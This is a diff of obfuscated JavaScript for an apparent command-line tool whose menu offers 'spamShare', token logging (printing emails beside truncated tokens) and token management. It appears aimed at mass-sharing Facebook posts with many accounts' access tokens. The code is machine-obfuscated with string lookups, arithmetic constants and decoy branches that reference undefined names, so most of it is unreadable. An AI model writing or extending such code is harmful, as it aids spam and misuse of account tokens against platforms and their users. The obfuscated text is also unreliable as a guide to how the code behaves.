-            'fCPhE': function (n, w) {
-                return n <= w;
+            'ihokh': function (N, V) {
+                return N - V;
             },
-            'ojyvH': function (n, w) {
-                return n !== w;
-            },
-            'GlvPS': aW(0x2b6),
-            'VFQNz': function (n, w) {
-                return n - w;
-            },
-            'OLtDr': function (n, w) {
-                return n - w;
+            'rGZtZ': function (N, V) {
+                return N - V;
             }
         };
-    for (let n = -0x306 * 0x7 + 0x2 * -0x115f + 0x37e9; Q[aW(0x20a)](n, tokens['length']); n++) {
-        if (Q['ojyvH'](Q[aW(0x302)], aW(0x332))) {
-            const w = emails[Q[aW(0x20d)](n, 0x1d2a + 0x149a + 0x1 * -0x31c3)], b = tokens[Q['OLtDr'](n, 0xf64 * -0x2 + 0x1 * 0x2533 + 0x2 * -0x335)][aW(0x3d6)](undefined, -0x1b21 + -0x105d + 0x2b8f);
-            console['log'](yellow + '(' + n + ')\x20' + white + '-\x20' + blue + w + '\x20' + white + '>\x20' + green + b + '...');
-        } else
-            return Q['Yqxkj'](n, aW(0x3c2));
+    for (let N = -0xbf1 + 0x6b * 0x26 + -0x3f0; U['lIqHs'](N, tokens[hJ(0x2e1)]); N++) {
+        const V = emails[U[hJ(0x3fe)](N, -0x262a + -0x8b7 * -0x1 + 0x104 * 0x1d)], B = tokens[U[hJ(0x2e8)](N, -0x2 * 0x8bf + -0x1ede * -0x1 + -0xd5f)][hJ(0x3b4)](undefined, -0x1 * -0x699 + -0x21 * -0x4c + -0x4 * 0x415);
+        console[hJ(0x38c)](yellow + '(' + N + ')\x20' + white + '-\x20' + blue + V + '\x20' + white + '>\x20' + green + B + hJ(0x1c1));
     }
 }
 async function main() {
-    const at = ZC, Q = {
-            'FwzlB': function (w, b) {
-                return w + b;
+    const hM = mz, U = {
+            'DYFmA': function (V, B) {
+                return V + B;
             },
-            'AZTNK': function (w, b) {
-                return w + b;
+            'HssZU': function (V) {
+                return V();
             },
-            'IDtUM': function (w) {
-                return w();
+            'GvTAn': function (V, B) {
+                return V * B;
             },
-            'cvigG': at(0x300),
-            'oykoe': function (w, b) {
-                return w(b);
+            'SVpub': function (V) {
+                return V();
             },
-            'vHwcj': at(0x3c6),
-            'RPXxu': function (w, b) {
-                return w === b;
+            'qPgea': function (V, B) {
+                return V + B;
             },
-            'LtzNx': at(0x3ed),
-            'OMAuB': at(0x244),
-            'GjKsJ': function (w, b) {
-                return w === b;
+            'fwSjw': function (V, B) {
+                return V + B;
             },
-            'kDHSp': function (w) {
-                return w();
+            'VnEYa': function (V) {
+                return V();
             },
-            'rjQym': function (w, b) {
-                return w === b;
+            'BbKwX': hM(0x385),
+            'JHdor': hM(0x28c),
+            'mCNBe': function (V, B) {
+                return V(B);
             },
-            'JxgcB': function (w, b) {
-                return w !== b;
+            'mgiGX': function (V, B) {
+                return V(B);
             },
-            'Axlxq': at(0x1e3),
-            'Pndir': function (w) {
-                return w();
+            'ANole': function (V, B) {
+                return V + B;
             },
-            'RCFep': function (w) {
-                return w();
+            'sNvsR': function (V, B) {
+                return V(B);
             },
-            'FPNgE': function (w) {
-                return w();
-            }
+            'xIoum': hM(0x40b),
+            'Jypgp': function (V, B) {
+                return V === B;
+            },
+            'UbNVX': function (V) {
+                return V();
+            },
+            'IJQTb': hM(0x1fd),
+            'xsPJs': function (V, B) {
+                return V === B;
+            },
+            'KDeaW': 'uIAkQ',
+            'FmHpS': 'eaMlP'
         };
-    setClear(), await Q['oykoe'](animate, banner), Q['oykoe'](logChoices, Q[at(0x1c8)]);
-    const n = await Q[at(0x1d2)](getCmd);
-    if (Q[at(0x3fe)](n, -0x1 * -0x1b3b + 0x254c + -0x2043 * 0x2))
-        Q[at(0x284)] !== Q[at(0x3c1)] ? spamShare() : (Y['log'](Q[at(0x3f9)](Q[at(0x2c1)](Q[at(0x1d2)](i), H), at(0x404) + W[at(0x35d)])), t());
+    setClear(), await U['sNvsR'](animate, banner), U[hM(0x3bb)](logChoices, U[hM(0x278)]);
+    const N = await getCmd();
+    if (U[hM(0x277)](N, 0x343 * 0x5 + 0x83 * 0x3c + 0x1781 * -0x2))
+        U['SVpub'](spamShare);
     else {
-        if (Q['GjKsJ'](n, 0x112 * 0xa + 0x1 * 0x89b + -0x134d))
-            Q[at(0x1d2)](setClear), logToken(), await Q['kDHSp'](cont), await Q[at(0x1d2)](main);
+        if (U['Jypgp'](N, 0x11 * 0x18a + -0x195e + -0xca))
+            U[hM(0x2bb)](setClear), U[hM(0x3d8)](logToken), await U[hM(0x2bb)](cont), await main();
         else {
-            if (Q[at(0x3eb)](n, -0x1297 + 0xc36 * 0x2 + -0x5d2))
-                Q[at(0x287)](Q[at(0x2e3)], Q[at(0x2e3)]) ? n(Q[at(0x210)]) : Q['Pndir'](tokenManagement);
-            else {
-                if (n === 0x1869 + -0x1f3 * -0x8 + 0x161 * -0x1d)
-                    Q[at(0x211)](feedback);
+            if (N === 0xc5b + -0x19ba * 0x1 + 0xd62) {
+                if (U[hM(0x403)] !== U[hM(0x403)])
+                    return C[hM(0x38c)](U[hM(0x271)](U[hM(0x271)](U[hM(0x3d8)](Q), t), hM(0x2c5) + F[hM(0x331)] + hM(0x259) + J['message'])), { 'retry': !![] };
                 else
-                    Q[at(0x3eb)](n, 0x9aa + 0x4e7 + -0xe8c) && Q[at(0x23d)](exit);
+                    U['HssZU'](tokenManagement);
+            } else {
+                if (U[hM(0x3a1)](N, -0xa1f + 0x2 * 0x129 + 0x1 * 0x7d1)) {
+                    if (U[hM(0x25f)] !== U[hM(0x1f9)])
+                        U[hM(0x3d8)](feedback);
+                    else {
+                        const g = mW => {
+                            const hd = hM, ml = 'a.' + mQ[hd(0x258)](U[hd(0x21b)](mt[hd(0x2e0)](), mF[hd(0x22c)]()))[hd(0x38d)](), mA = U['DYFmA'](mJ['floor'](mM[hd(0x22c)]() * (-0x2 * 0x17e + 0x2f * -0x91 + 0x1d9f * 0x1)), -0x412 * 0x3 + -0x1 * 0x1007 + 0x1c3e);
+                            return md[hd(0x38c)](U[hd(0x271)](U['HssZU'](mf) + mp, hd(0x3ee))), mH[hd(0x38c)](U['DYFmA'](U[hd(0x1fa)](g), mE) + (hd(0x34c) + mv + mW)), mT[hd(0x38c)](U[hd(0x36e)](U['fwSjw'](U[hd(0x261)](mG), mL), hd(0x2e4) + mx + ml + mP + hd(0x317) + me + mA)), 'https://www.facebook.com/photo.php?fbid=' + mW + hd(0x39b) + ml + hd(0x2c9) + mA + hd(0x2b6);
+                        };
+                        if (!m2['includes'](U[hM(0x325)]) && !m3['includes'](U[hM(0x399)])) {
+                            mQ = new mt(mF);
+                            const C = mJ['pathname']['split']('/')[hM(0x303)](mM), Q = C[C[hM(0x2e1)] - (0x59c + -0x3cb * -0x2 + -0x133 * 0xb)];
+                            return U[hM(0x3bb)](g, Q);
+                        } else {
+                            if (m9['includes'](hM(0x385))) {
+                                md = new mf(mp);
+                                const t = mH[hM(0x423)][hM(0x34a)](hM(0x385));
+                                return U['mgiGX'](g, t);
+                            }
+                        }
+                        return mV[hM(0x38c)](U[hM(0x1bd)](U[hM(0x2b4)](U[hM(0x261)](mB), mg), hM(0x2f4))), mC;
+                    }
+                } else
+                    N === 0x641 + 0x3 * -0xbec + 0x8 * 0x3b1 && U[hM(0x2bb)](exit);
             }
         }
     }
